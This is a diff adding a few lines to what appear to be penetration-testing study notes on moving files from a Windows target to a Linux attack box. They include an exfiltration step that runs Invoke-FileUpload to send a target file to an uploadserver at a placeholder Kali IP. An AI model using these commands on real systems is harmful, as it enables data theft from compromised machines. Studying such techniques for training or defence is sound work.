@@ -1,0 +1,7 @@
+- If you need to upload a file from Windows to Linux AP, you can use PSUpload.ps1
+	- pip3 install uploadserver from AP
+	- python3 -m uploadserver
+	- curl the PSUpload.ps1 script to windows machine
+	- From PowerShell, run . .\PSUpload.ps1
+	- Invoke-FileUpload -Uri http://<Kali_IP>:8000/upload -File C:\<Windows_targetFile>
+- ![[Pictures/Pasted image 20230831093654.png]]
